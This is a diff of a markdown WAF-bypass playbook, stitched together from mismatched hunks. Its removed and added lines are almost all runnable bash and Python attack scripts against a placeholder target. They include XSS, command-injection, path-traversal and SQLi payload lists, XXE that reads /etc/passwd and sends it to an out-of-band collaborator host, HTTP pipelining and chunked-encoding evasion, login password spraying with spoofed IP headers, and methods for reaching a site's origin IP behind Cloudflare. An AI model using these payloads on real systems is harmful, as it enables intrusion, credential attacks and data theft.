-  "\" onerror=\"alert(1)"
-  "' onerror='alert(1)"
-  "javascript:alert(1)"
-  "JaVaScRiPt:alert(1)"
-  "java&#x09;script:alert(1)"
-  "java\tscript:alert(1)"
-  # Tag attribute breakout
-  "\"><script>alert(1)</script>"
-  "'><script>alert(1)</script>"
-  # Template literal
-  "<script>alert\`1\`</script>"
-  # Null byte
-  "<scr\x00ipt>alert(1)</scr\x00ipt>"
-  # Nested tags
-  "<scr<script>ipt>alert(1)</scr</script>ipt>"
-  "<sc<script>ript>alert(1)</sc</script>ript>"
-  # Expression injection (Angular/Vue)
-  "{{constructor.constructor('alert(1)')()}}"
-  "${alert(1)}"
-  # Polyglot
-  "jaVasCript:/*-/*\`/*\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e"
-  # Mutation XSS
-  "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">"
-  # Script in data URI
-  "<iframe src=\"data:text/html,<script>alert(1)</script>\">"
-  # Srcdoc
-  "<iframe srcdoc=\"<script>alert(1)</script>\">"
-  # Object data
-  "<object data=\"javascript:alert(1)\">"
-  # CSS expression (IE)
-  "<div style=\"background-image:url(javascript:alert(1))\">"
-  # SVG animate
-  "<svg><animate onbegin=alert(1) attributeName=x></svg>"
-  "<svg><set onbegin=alert(1) attributeName=x></svg>"
-  # meta refresh
-  "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">"
-  # form action
-  "<form action=\"javascript:alert(1)\"><input type=submit></form>"
-  # link href
-  "<link rel=import href=\"javascript:alert(1)\">"
-)
-
-for payload in "${XSS_PAYLOADS[@]}"; do
-  ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))" 2>/dev/null)
-  STATUS=$(curl -so /dev/null -w "%{http_code}" "${TARGET_URL}?${PARAM}=$ENC")
-  RESP=$(curl -s "${TARGET_URL}?${PARAM}=$ENC")
-  REFLECTED=$(echo "$RESP" | grep -oP "alert\(1\)|onerror|onload|javascript:" | head -1)
-  echo "$STATUS [$REFLECTED] <- ${payload:0:50}" | tee -a xss_bypass.txt
-done
-
-# Context-specific XSS — HTML attribute context
-curl -s "${TARGET_URL}?${PARAM}=\" onmouseover=alert(1) test=\"" | tee xss_attr.txt
-curl -s "${TARGET_URL}?${PARAM}=' onmouseover=alert(1) test='" | tee xss_attr2.txt
-
-# JS context
-curl -s "${TARGET_URL}?${PARAM}='-alert(1)-'" | tee xss_js.txt
-curl -s "${TARGET_URL}?${PARAM}=\`;alert(1)//'" | tee xss_js2.txt
-
-# CSP-aware XSS via JSONP
-# Find JSONP endpoints allowed in CSP
-curl -sI $TARGET_URL | grep -i "content-security-policy" | grep -oP "https?://[^;'\"]+" | sort -u | tee csp_sources.txt
-# Check if any of those have JSONP
-while read src; do
-  curl -s "${src}?callback=alert" | grep -q "alert(" && echo "[JSONP] $src" | tee -a xss_jsonp.txt
-done < csp_sources.txt
-```
-
-## PHASE 5 — COMMAND INJECTION BYPASS
-
-```bash
-TARGET_URL="https://target.com/api/ping"
-
-# Basic command injection bypass techniques
-CMD_BYPASSES=(
-  # Space bypass
-  "127.0.0.1;id"
-  "127.0.0.1;{id}"
-  "127.0.0.1;\${IFS}id"
-  "127.0.0.1;\$IFS\$9id"
-  "127.0.0.1;\${IFS}id"
-  "127.0.0.1%09id"   # tab
-  "127.0.0.1%0aid"   # newline
-  "127.0.0.1%0did"   # CR
-  # Separators
-  "127.0.0.1|id"
-  "127.0.0.1||id"
-  "127.0.0.1&&id"
-  "127.0.0.1%26id"
-  "127.0.0.1%26%26id"
-  "127.0.0.1\`id\`"
-  "127.0.0.1\$(id)"
-  # Keyword bypass
-  "127.0.0.1;i\$@d"
-  "127.0.0.1;i''d"
-  "127.0.0.1;i\"\"d"
-  "127.0.0.1;wh\oami"
-  # Wildcard
-  "127.0.0.1;/usr/bin/i??"
-  "127.0.0.1;/usr/bin/*d"
-  # Env var
-  "127.0.0.1;\$SHELL -c id"
-  "127.0.0.1;{cat,/etc/passwd}"
-  "127.0.0.1;{ls,-la,/}"
-)
-
-for payload in "${CMD_BYPASSES[@]}"; do
-  ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))" 2>/dev/null)
-  RESP=$(curl -s "${TARGET_URL}?host=$ENC")
-  echo "$RESP" | grep -qiE "uid=|root:|www-data" && echo "[CMD INJECTION] $payload" | tee -a cmdi_bypass.txt
-done
-
-# OOB command injection
-curl -s "${TARGET_URL}?host=127.0.0.1\$(curl+http://COLLAB/\$(id))" | tee cmdi_oob.txt
-curl -s "${TARGET_URL}?host=127.0.0.1;nslookup+\$(whoami).COLLAB" | tee cmdi_dns.txt
-```
-
-## PHASE 6 — PATH TRAVERSAL BYPASS
-
-```bash
-TARGET_URL="https://target.com/api/download"
-
-# Path traversal bypass payloads
-TRAVERSAL_BYPASSES=(
-  # Basic
-  "../../../../etc/passwd"
-  "..//..//..//..//etc/passwd"
-  "..%2F..%2F..%2F..%2Fetc%2Fpasswd"
-  "..%252F..%252F..%252Fetc%252Fpasswd"   # double URL encode
-  "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
-  "%2e%2e/%2e%2e/%2e%2e/etc/passwd"
-  "..%c0%af..%c0%af..%c0%afetc/passwd"    # overlong UTF-8
-  "..%e0%80%afetc/passwd"
-  "....//....//....//etc/passwd"
-  "....\/....\/....\/etc/passwd"
-  "../../../etc/passwd%00.png"            # null byte
-  "../../../etc/passwd%00"
-  "../../../etc/passwd%20"
-  "..\\..\\..\\windows\\win.ini"          # Windows
-  "..%5c..%5c..%5cwindows%5cwin.ini"
-  "..\\..\\..\\"
-  # Absolute paths
-  "/etc/passwd"
-  "/./etc/./passwd"
-  "/etc//passwd"
-  # Filter bypass via accepted extension + traversal
-  "safe.txt/../../../etc/passwd"
-  "images/../../../etc/passwd"
-  # PHP filter stream
-  "php://filter/convert.base64-encode/resource=/etc/passwd"
-  "php://filter/read=string.rot13/resource=/etc/passwd"
-)
-
-for payload in "${TRAVERSAL_BYPASSES[@]}"; do
-  ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))" 2>/dev/null)
-  RESP=$(curl -s "${TARGET_URL}?file=$ENC")
-  echo "$RESP" | grep -q "root:" && echo "[TRAVERSAL] $payload" | tee -a traversal_bypass.txt
-done
-```
-
-## PHASE 7 — XXE BYPASS
-
-```bash
-TARGET_URL="https://target.com/api/import"
-
-# XXE bypass payloads
-# 1. UTF-16 encoding
-python3 -c "
-content = '''<?xml version=\"1.0\" encoding=\"UTF-16\"?>
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>
-<root>&xxe;</root>'''
-with open('/tmp/xxe_utf16.xml', 'wb') as f:
-    f.write(content.encode('utf-16'))
-"
-curl -s -X POST "$TARGET_URL" \
-  -H "Content-Type: application/xml; charset=UTF-16" \
-  --data-binary @/tmp/xxe_utf16.xml | tee xxe_utf16.txt
-
-# 2. Parameter entity in DTD (bypass inline entity blocks)
-cat > /tmp/xxe_param.xml << 'EOF'
-<?xml version="1.0"?>
-<!DOCTYPE foo [
-  <!ENTITY % file SYSTEM "file:///etc/passwd">
-  <!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://COLLAB/?x=%file;'>">
-  %eval;
-]>
-<root>&exfil;</root>
-EOF
-curl -s -X POST "$TARGET_URL" -H "Content-Type: application/xml" \
-  --data-binary @/tmp/xxe_param.xml | tee xxe_param.txt
-
-# 3. CDATA bypass
-cat > /tmp/xxe_cdata.xml << 'EOF'
-<?xml version="1.0"?>
-<!DOCTYPE foo [
-  <!ENTITY % start "<![CDATA[">
-  <!ENTITY % file SYSTEM "file:///etc/passwd">
-  <!ENTITY % end "]]>">
-  <!ENTITY % combined "<!ENTITY all '%start;%file;%end;'>">
-  %combined;
-]>
-<root>&all;</root>
-EOF
-curl -s -X POST "$TARGET_URL" -H "Content-Type: application/xml" \
-  --data-binary @/tmp/xxe_cdata.xml | tee xxe_cdata.txt
-
-# 4. Blind XXE via error messages
-cat > /tmp/xxe_error.xml << 'EOF'
-<?xml version="1.0"?>
-<!DOCTYPE foo [
-  <!ENTITY % file SYSTEM "file:///etc/passwd">
-  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
-  %eval;
-  %error;
-]>
-<root/>
-EOF
-curl -s -X POST "$TARGET_URL" -H "Content-Type: application/xml" \
-  --data-binary @/tmp/xxe_error.xml | tee xxe_error_based.txt
-
-# 5. JSON to XML conversion bypass — send JSON that becomes XML
-curl -s -X POST "$TARGET_URL" \
-  -H "Content-Type: application/json" \
-  -d '{"xml":"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>"}' \
-  | tee xxe_json_converted.txt
-
-# 6. XInclude bypass (when DOCTYPE not allowed)
-curl -s -X POST "$TARGET_URL" \
-  -H "Content-Type: application/xml" \
-  --data '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></foo>' \
-  | tee xxe_xinclude.txt
-```
-
-## PHASE 8 — HTTP-LEVEL BYPASS
-
-```bash
-TARGET_URL="https://target.com"
-TARGET_HOST="target.com"
-
-# 1. Chunked Transfer Encoding bypass
-python3 << 'PYEOF'
-import socket, ssl
-
-HOST = "target.com"
-PORT = 443
-PAYLOAD = "1' OR '1'='1"
-
-# Send attack in chunked body (some WAFs only inspect full body)
-body = f"id={PAYLOAD}"
-chunk_size = hex(len(body))[2:]
-chunked_body = f"{chunk_size}\r\n{body}\r\n0\r\n\r\n"
-
-request = (
-    f"POST /api/login HTTP/1.1\r\n"
-    f"Host: {HOST}\r\n"
-    f"Content-Type: application/x-www-form-urlencoded\r\n"
-    f"Transfer-Encoding: chunked\r\n"
-    f"Connection: close\r\n"
-    f"\r\n"
-    f"{chunked_body}"
-).encode()
-
-ctx = ssl.create_default_context()
-ctx.check_hostname = False
-ctx.verify_mode = ssl.CERT_NONE
-with socket.create_connection((HOST, PORT)) as s:
-    with ctx.wrap_socket(s, server_hostname=HOST) as ss:
-        ss.sendall(request)
-        print(ss.recv(4096).decode(errors='replace'))
-PYEOF
-
-# 2. Header injection — bypass IP blocklists
-for ip_header in "X-Forwarded-For" "X-Real-IP" "X-Originating-IP" "Client-IP" \
-  "True-Client-IP" "X-Client-IP" "CF-Connecting-IP" "Forwarded" "X-Cluster-Client-IP" \
-  "X-Forwarded" "X-Remote-IP" "X-Remote-Addr" "X-Host" "X-Custom-IP-Authorization"; do
-  for spoof_ip in "127.0.0.1" "localhost" "192.168.1.1" "10.0.0.1"; do
-    STATUS=$(curl -so /dev/null -w "%{http_code}" "$TARGET_URL/?id=1' OR 1=1--" \
-      -H "$ip_header: $spoof_ip")
-    [ "$STATUS" != "403" ] && [ "$STATUS" != "406" ] && [ "$STATUS" != "429" ] && \
-      echo "[BYPASS] $ip_header: $spoof_ip -> HTTP $STATUS" | tee -a header_ip_bypass.txt
+# Resolve all SANs and find non-CDN IPs
+openssl s_client -connect TARGET.COM:443 </dev/null 2>/dev/null | \
+  openssl x509 -noout -text 2>/dev/null | \
+  grep -oE 'DNS:[^,]+' | sed 's/DNS://' | \
+  while read san; do
+    ip=$(dig +short "$san" | tail -1)
+    echo "$san → $ip"
   done
-done
-
-# 3. HTTP method override
-for method_header in "X-HTTP-Method-Override" "X-HTTP-Method" "X-Method-Override" "_method"; do
-  STATUS=$(curl -so /dev/null -w "%{http_code}" -X POST "$TARGET_URL/api/admin/delete" \
-    -H "$method_header: DELETE" -H "Content-Type: application/json" \
-    -d '{"id":1}')
-  echo "$method_header: DELETE -> HTTP $STATUS" | tee -a method_override.txt
-done
-
-# 4. Protocol downgrade (HTTP/1.0 vs HTTP/1.1 behavior differences)
-curl -s --http1.0 "${TARGET_URL}?id=1' OR 1=1--" | tee http10_bypass.txt
-curl -s --http2 "${TARGET_URL}?id=1' OR 1=1--" 2>/dev/null | tee http2_bypass.txt
-
-# 5. Content-Type manipulation bypass
-for ct in \
-  "application/json" \
-  "application/x-www-form-urlencoded" \
-  "text/plain" \
-  "application/xml" \
-  "multipart/form-data; boundary=----test" \
-  "application/octet-stream" \
-  "text/html" \
-  "application/javascript" \
-  "application/x-json" \
-  "application/x-javascript"; do
-  STATUS=$(curl -so /dev/null -w "%{http_code}" -X POST "$TARGET_URL/api/search" \
-    -H "Content-Type: $ct" \
-    --data "query=1' OR 1=1--")
-  echo "$ct -> HTTP $STATUS" | tee -a content_type_bypass.txt
-done
-
-# 6. HTTP/2 header injection bypass
-# HTTP/2 WAFs may not handle pseudo-header manipulation
-curl -s --http2 "$TARGET_URL/?id=1'%20OR%201=1--" 2>/dev/null | tee http2_sqli.txt
-
-# 7. Large header value bypass (some WAFs skip inspection on very long values)
-LONG_PADDING=$(python3 -c "print('A'*8192)")
-curl -s "$TARGET_URL/?id=1" \
-  -H "X-Padding: $LONG_PADDING" \
-  -H "X-Payload: 1' OR 1=1--" | tee large_header_bypass.txt
-
-# 8. Pipeline bypass
-python3 << 'PYEOF'
-import socket, ssl
-
-HOST = "target.com"
-PORT = 443
-
-# Send two requests pipelined — WAF may only inspect first
-req1 = (
-    "GET / HTTP/1.1\r\n"
-    f"Host: {HOST}\r\n"
-    "Connection: keep-alive\r\n"
-    "\r\n"
-)
-req2 = (
-    "GET /?id=1'+OR+1=1-- HTTP/1.1\r\n"
-    f"Host: {HOST}\r\n"
-    "Connection: close\r\n"
-    "\r\n"
-)
-ctx = ssl.create_default_context()
-ctx.check_hostname = False
-ctx.verify_mode = ssl.CERT_NONE
-with socket.create_connection((HOST, PORT)) as s:
-    with ctx.wrap_socket(s, server_hostname=HOST) as ss:
-        ss.sendall((req1 + req2).encode())
-        import time; time.sleep(1)
-        print(ss.recv(8192).decode(errors='replace')[:1000])
-PYEOF
 ```
 
-## PHASE 9 — RATE LIMIT BYPASS
+### Method 9: Error Page Fingerprinting
 
 ```bash
-TARGET_URL="https://target.com/api/login"
+# Trigger 404 errors and analyze response for server-specific info
+curl -sk "https://TARGET.COM/thiswillneverexist_$(date +%s).html" -I
+curl -sk "https://TARGET.COM/thiswillneverexist_$(date +%s).php"
 
-# Rate limit bypass techniques
+# Look for: Apache/nginx version, PHP version, server software
+# Different server software = different IP (CDN vs origin)
 
-# 1. IP rotation via X-Forwarded-For
-python3 << 'PYEOF'
-import requests, random, string
+# Trigger 500 error
+curl -sk "https://TARGET.COM/?param[]&param[]=x" 
 
-TARGET = "https://target.com/api/login"
+# Check for debug headers on errors
+curl -sk "https://TARGET.COM/nonexistent" -v 2>&1 | grep -iE "(x-backend|x-origin|x-server|x-real|x-forwarded)"
+```
 
-def random_ip():
-    return f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
+### Method 10: Direct IP Probing with Host Header Spoofing
 
-passwords = ["password", "123456", "admin", "Password1", "welcome"]
+```bash
+# Once you have a candidate IP, verify it's the origin
+TARGET_IP="1.2.3.4"
+TARGET_HOST="TARGET.COM"
 
-for pwd in passwords:
-    ip = random_ip()
-    headers = {
-        "X-Forwarded-For": ip,
-        "X-Real-IP": ip,
-        "Content-Type": "application/json"
-    }
-    r = requests.post(TARGET, json={"email": "admin@target.com", "password": pwd}, headers=headers)
-    print(f"{pwd} (IP: {ip}) -> HTTP {r.status_code}: {r.text[:80]}")
-PYEOF
+# Test direct access bypassing WAF
+curl -sk "http://${TARGET_IP}/" -H "Host: ${TARGET_HOST}" -I
+curl -sk "https://${TARGET_IP}/" -H "Host: ${TARGET_HOST}" --insecure -I
 
-# 2. Null byte in password (may bypass rate limit per-value checks)
-curl -s -X POST "$TARGET_URL" \
-  -H "Content-Type: application/json" \
-  -d '{"email":"admin@target.com","password":"admin\u0000extra"}' | tee rate_nullbyte.txt
+# Test if WAF payloads work against direct IP
+curl -sk "http://${TARGET_IP}/?id=1'OR'1'='1" -H "Host: ${TARGET_HOST}"
 
-# 3. Case variation in email
-for email in "admin@target.com" "Admin@target.com" "ADMIN@target.com" \
-  "aDmIn@target.com" "admin+tag@target.com" "admin@TARGET.COM"; do
-  curl -s -X POST "$TARGET_URL" \
-    -H "Content-Type: application/json" \
-    -d "{\"email\":\"$email\",\"password\":\"test123\"}" | tee -a rate_email_case.txt
-done
-
-# 4. Padding/extra fields bypass
-curl -s -X POST "$TARGET_URL" \
-  -H "Content-Type: application/json" \
-  -d '{"email":"admin@target.com","password":"test","padding":"'$(python3 -c "print('A'*1000))"'"}' | tee rate_padding.txt
-
-# 5. Different endpoint paths for same functionality
-for path in /api/login /api/v1/login /api/v2/login /auth/login /api/signin \
-  /api/authenticate /api/session /api/token /oauth/token; do
-  STATUS=$(curl -so /dev/null -w "%{http_code}" -X POST "${TARGET_URL%/login}${path}" \
-    -H "Content-Type: application/json" \
-    -d '{"email":"admin@target.com","password":"test123"}')
-  [ "$STATUS" != "404" ] && [ "$STATUS" != "000" ] && \
-    echo "$path -> HTTP $STATUS" | tee -a rate_alt_paths.txt
+# Check for internal management interfaces
+for port in 8080 8443 8888 9090 9443 2082 2083 2086 2087; do
+  curl -sk --connect-timeout 3 "http://${TARGET_IP}:${port}/" -H "Host: ${TARGET_HOST}" -o /dev/null -w "%{http_code} port ${port}\n"
 done
 ```
 
-## PHASE 10 — CLOUDFLARE-SPECIFIC BYPASS
+### Method 11: DNS History Services
 
 ```bash
-TARGET_DOMAIN="target.com"
+# viewdns.info (no API key needed for basic)
+curl -s "https://viewdns.info/iphistory/?domain=TARGET.COM" 2>/dev/null | \
+  grep -oP '(?<=<td>)[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}(?=</td>)'
 
-# Method 1: Find origin IP (see Phase 2)
-# Method 2: Access via direct IP with Host header
-ORIGIN_IP="DISCOVERED_ORIGIN_IP"
-curl -sk "https://$ORIGIN_IP/" -H "Host: $TARGET_DOMAIN" | head -20 | tee cf_bypass_direct.txt
-# Attack via direct IP — bypasses Cloudflare entirely
-curl -sk "https://$ORIGIN_IP/?id=1' OR 1=1--" -H "Host: $TARGET_DOMAIN" | tee cf_bypass_sqli.txt
+# dnshistory.org
+curl -s "https://dnshistory.org/historical-dns-records/a/TARGET.COM" | \
+  grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}'
 
-# Method 3: Cloudflare Workers might have different rules than main app
-for cf_path in /cdn-cgi/ /cdn-cgi/trace /cdn-cgi/challenge-platform; do
-  STATUS=$(curl -so /dev/null -w "%{http_code}" "https://$TARGET_DOMAIN$cf_path")
-  echo "$cf_path -> HTTP $STATUS" | tee -a cf_workers.txt
-done
+# DNSDumpster (needs session token)
+curl -s "https://dnsdumpster.com" | grep -i "csrfmiddlewaretoken" | head -1
 
-# Method 4: Cloudflare bypass via old/alternative hostnames
-for alt in "www.$TARGET_DOMAIN" "direct.$TARGET_DOMAIN" "origin.$TARGET_DOMAIN" \
-  "backend.$TARGET_DOMAIN" "api.$TARGET_DOMAIN" "app.$TARGET_DOMAIN"; do
-  IP=$(dig +short $alt A 2>/dev/null | head -1)
-  [ -n "$IP" ] && echo "$alt -> $IP" | tee -a cf_alt_hosts.txt
-done
+# HackerTarget DNS history
+curl -s "https://api.hackertarget.com/hostsearch/?q=TARGET.COM" | \
+  awk -F',' '{print $2}' | sort -u
 
-# Method 5: Payload obfuscation for Cloudflare's ruleset
-CF_BYPASSES=(
-  "1/**/OR/**/1=1--"
-  "1/*!OR*/1=1--"
-  "1%0aOR%0a1%3D1--"
-  "1\tOR\t1=1--"
-  "1%0bOR%0b1=1--"
-  "1/*!50000OR*/1=1--"
-  "1+OR+1+%3D+1--"
-)
-for payload in "${CF_BYPASSES[@]}"; do
-  ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))" 2>/dev/null)
-  STATUS=$(curl -so /dev/null -w "%{http_code}" "https://$TARGET_DOMAIN/?id=$ENC" \
-    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
-  echo "$STATUS <- $payload" | tee -a cf_sqli_bypass.txt
-done
-
-# Method 6: Cloudflare challenge bypass detection
-# Look for cf_clearance cookie requirement
-curl -sI "https://$TARGET_DOMAIN/?id=1' OR 1=1--" | grep -i "cf-chl\|cf_clearance\|403\|challenge" | tee cf_challenge.txt
+# Rapid7 FDNS data (if access available)
+# grep "TARGET.COM" fdns_a.json | jq -r '.value' | sort -u
 ```
 
-## PHASE 11 — AWS WAF BYPASS
+### Method 12: IPv6 Origin Discovery
 
 ```bash
-TARGET_URL="https://target.com"
+# IPv6 is frequently not routed through WAF
+dig AAAA TARGET.COM
+dig AAAA www.TARGET.COM
 
-# AWS WAF uses managed rule groups — identify which are enabled
-# Test common AWS managed rule triggers
-curl -s "${TARGET_URL}?id=1 UNION SELECT 1,2,3--" -H "User-Agent: sqlmap" | tee aws_waf_test.txt
-curl -s "${TARGET_URL}?id=../../../etc/passwd" | tee aws_waf_lfi.txt
-
-# AWS WAF SQLi bypass
-AWS_SQLI_BYPASSES=(
-  "1/**/UNION/**/SELECT/**/1,2,3--"
-  "1 UNION%23%0aSELECT 1,2,3--"
-  "1%0aUNION%0aSELECT%0a1,2,3--"
-  "1/*!UNION*//*!SELECT*/1,2,3--"
-  "1 UniOn SeLeCt 1,2,3--"
-  "1 union(select(1),(2),(3))--"
-)
-
-for payload in "${AWS_SQLI_BYPASSES[@]}"; do
-  STATUS=$(curl -so /dev/null -w "%{http_code}" "${TARGET_URL}?id=$payload")
-  echo "$STATUS <- $payload" | tee -a aws_waf_bypass.txt
+# Enumerate AAAA records for subdomains
+for sub in www mail smtp ftp api dev staging; do
+  ipv6=$(dig AAAA ${sub}.TARGET.COM +short 2>/dev/null)
+  [ -n "$ipv6" ] && echo "${sub}.TARGET.COM → $ipv6"
 done
 
-# AWS WAF LFI bypass
-AWS_LFI_BYPASSES=(
-  "..%2F..%2F..%2Fetc%2Fpasswd"
-  "..%252F..%252F..%252Fetc%252Fpasswd"
-  "....//....//etc/passwd"
-  "..;/etc/passwd"
-  "%2e%2e%2fetc%2fpasswd"
-)
+# Direct probe to IPv6 origin
+curl -6 -sk "https://[2606:4700::1234:5678]/" -H "Host: TARGET.COM" -I
 
-for payload in "${AWS_LFI_BYPASSES[@]}"; do
-  STATUS=$(curl -so /dev/null -w "%{http_code}" "${TARGET_URL}/download?file=$payload")
-  echo "$STATUS <- $payload" | tee -a aws_lfi_bypass.txt
-done
-
-# AWS WAF XSS bypass — HTML encoder + comment injection
-curl -s "${TARGET_URL}?q=<script>alert(1)</script>" -H "User-Agent: Mozilla/5.0" | tee aws_xss_test.txt
-curl -s "${TARGET_URL}?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E" | tee aws_xss_enc.txt
-curl -s "${TARGET_URL}?q=<img/**/src=x/**/onerror=alert(1)>" | tee aws_xss_comment.txt
+# Check if IPv6 bypasses WAF rules
+curl -6 -sk "https://[IPV6_ADDR]/?id=1'OR'1'='1" -H "Host: TARGET.COM"
 ```
 
-## PHASE 12 — MODSECURITY CRS BYPASS
+---
 
-```bash
-TARGET_URL="https://target.com"
+## 3. SQLi WAF BYPASS
 
-# Paranoia Level 1 (default) bypasses
-PL1_BYPASSES=(
-  # PL1 allows these
-  "1 OR sleep(5)--"
-  "1 UNION SELECT version()--"
-  "<script>alert(1)</script>"
-)
+### 3.1 MySQL WAF Bypass Techniques
 
-# Paranoia Level 2 bypasses
-PL2_BYPASSES=(
-  "1/**/OR/**/sleep(5)--"
-  "1%0aOR%0asleep(5)--"
-  "<ScRiPt>alert(1)</ScRiPt>"
-  "<img/src=x/onerror=alert(1)>"
-)
-
-# Paranoia Level 3 bypasses (very strict)
-PL3_BYPASSES=(
-  "1/*!50000OR*/1=1--"
-  "<svg onload=eval(atob('YWxlcnQoMSk='))>"
-  # base64-encoded alert(1) = YWxlcnQoMSk=
-)
-
-# Paranoia Level 4 (strictest)
-PL4_BYPASSES=(
-  # PL4 blocks nearly everything — need OOB, timing, or direct IP
-  "1;SELECT SLEEP(5)--"
-)
-
-# Test each set
-for payload in "${PL1_BYPASSES[@]}" "${PL2_BYPASSES[@]}"; do
-  STATUS=$(curl -so /dev/null -w "%{http_code}" "${TARGET_URL}?id=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))" 2>/dev/null)")
-  echo "$STATUS <- $payload" | tee -a modsec_bypass.txt
-done
-
-# ModSecurity rule bypass via multipart/form-data
-curl -s -X POST "$TARGET_URL/api/search" \
-  -F "query=1' OR 1=1--" \
-  -F "extra=test" | tee modsec_multipart.txt
-
-# ModSecurity bypass via Content-Type trick
-curl -s -X POST "$TARGET_URL/api/search" \
-  -H "Content-Type: application/x-www-form-urlencoded; charset=ibm037" \
-  --data "query=1' OR 1=1--" | tee modsec_charset.txt
-
-# ModSecurity PCRE limit bypass (very long payload to exhaust regex)
-PADDING=$(python3 -c "print('A'*10000)")
-curl -s "${TARGET_URL}?padding=$PADDING&id=1' OR 1=1--" | tee modsec_pcre_bypass.txt
+**Comment Variations**
+```sql
+-- Standard: SELECT * FROM users WHERE id=1 UNION SELECT 1,2,3
+-- WAF bypass comment styles:
+SELECT/**/username/**/FROM/**/users
+SELECT/*!*/username/*!*/FROM/*!*/users
+SELECT/*!50000*/username/*!50000*/FROM/*!50000*/users
+SELECT/*!32302*/username/*!32302*/FROM/*!32302*/users
+1'/**/UNION/**/SELECT/**/1,2,3--+-
+1'/*!UNION*//*!SELECT*/1,2,3--+-
+1'/*!50000UNION*//*!50000SELECT*/1,2,3--+-
 ```
 
-## PHASE 13 — IMPERVA/INCAPSULA BYPASS
+**Whitespace Substitution**
+```sql
+-- Replace spaces with:
+%09    (tab)
+%0a    (newline)
+%0d    (carriage return)
+%0c    (form feed)
+%0b    (vertical tab)
+%a0    (non-breaking space, some parsers)
+()     (empty parentheses where allowed)
+/**/   (inline comment)
 
-```bash
-TARGET_URL="https://target.com"
-
-# Imperva relies heavily on reputation + signature matching
-# Strategy: make payload look legitimate
-
-# JavaScript encoding
-IMPERVA_XSS=(
-  "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>"
-  "<script>eval(atob('YWxlcnQoMSk='))</script>"
-  "<svg onload=setTimeout`alert\x281\x29`>"
-  "<script>window['al'+'ert'](1)</script>"
-  "<script>window['\x61\x6c\x65\x72\x74'](1)</script>"
-)
-
-for payload in "${IMPERVA_XSS[@]}"; do
-  ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))" 2>/dev/null)
-  STATUS=$(curl -so /dev/null -w "%{http_code}" "${TARGET_URL}?q=$ENC" \
-    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" \
-    -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
-    -H "Accept-Language: en-US,en;q=0.5" \
-    -H "Accept-Encoding: gzip, deflate, br")
-  echo "$STATUS <- ${payload:0:60}" | tee -a imperva_bypass.txt
-done
-
-# Imperva cookie bypass — send incap_ses cookie
-INCAP_COOKIE=$(curl -sc /dev/null -o /dev/null -w "%{http_code}" $TARGET_URL 2>/dev/null)
-curl -s "$TARGET_URL/?id=1' OR 1=1--" \
-  -b "incap_ses_test=test; visid_incap_test=test" | tee imperva_cookie.txt
-
-# Slow HTTP evasion (send payload slowly)
-python3 << 'PYEOF'
-import socket, ssl, time
-
-HOST = "target.com"
-PAYLOAD = "1' OR '1'='1"
-# Send headers slowly — evade rate-based analysis
-req_parts = [
-    f"GET /?id={PAYLOAD} HTTP/1.1\r\n",
-    f"Host: {HOST}\r\n",
-    "User-Agent: Mozilla/5.0\r\n",
-    "Connection: close\r\n",
-    "\r\n"
-]
-ctx = ssl.create_default_context()
-ctx.check_hostname = False
-ctx.verify_mode = ssl.CERT_NONE
-with socket.create_connection((HOST, 443)) as s:
-    with ctx.wrap_socket(s, server_hostname=HOST) as ss:
-        for part in req_parts:
-            ss.sendall(part.encode())
-            time.sleep(0.5)  # slow send
-        print(ss.recv(4096).decode(errors='replace')[:500])
-PYEOF
+-- Examples:
+1'%09UNION%09SELECT%091,2,3--+-
+1'%0aUNION%0aSELECT%0a1,2,3--+-
+1'%23%0aUNION%23%0aSELECT%23%0a1,2,3%23%0a
+-- (#) is comment in MySQL, %23 = #, %0a = newline ends the comment
 ```
 
-## PHASE 14 — UNICODE AND ENCODING BYPASS
+**Case Variation**
+```sql
+uNiOn SeLeCt
+UnIoN SeLeCt
+UNION SELECT
+union select
+uNIoN sELEcT
+```
+
+**Function Equivalents**
+```sql
+-- SLEEP alternatives for time-based
+SLEEP(5)
+BENCHMARK(50000000,MD5(1))
+GET_LOCK('a',5)
+WAIT_FOR_EXECUTED_GTID_SET('3E11FA47-71CA-11E1-9E33-C80AA9429562:1',5)
+
+-- CONCAT alternatives  
+CONCAT(0x41,0x42)
+CONCAT_WS(0x20,0x41,0x42)
+MAKE_SET(7,0x41,0x42,0x43)
+ELT(1,0x41)
+CHAR(65)
+HEX('A')
+
+-- VERSION alternatives
+@@VERSION
+@@GLOBAL.VERSION  
+VERSION()
+```
+
+**Scientific Notation Bypass**
+```sql
+-- Numeric context bypass
+1E0 UNION SELECT ...
+1.0e0 UNION SELECT ...
+0x41 = 65
+0b1000001 = 65
+```
+
+**INFORMATION_SCHEMA Alternatives**
+```sql
+-- When information_schema is blocked:
+SELECT * FROM sys.schema_table_statistics_with_buffer;
+SELECT * FROM sys.x$schema_table_statistics_with_buffer;
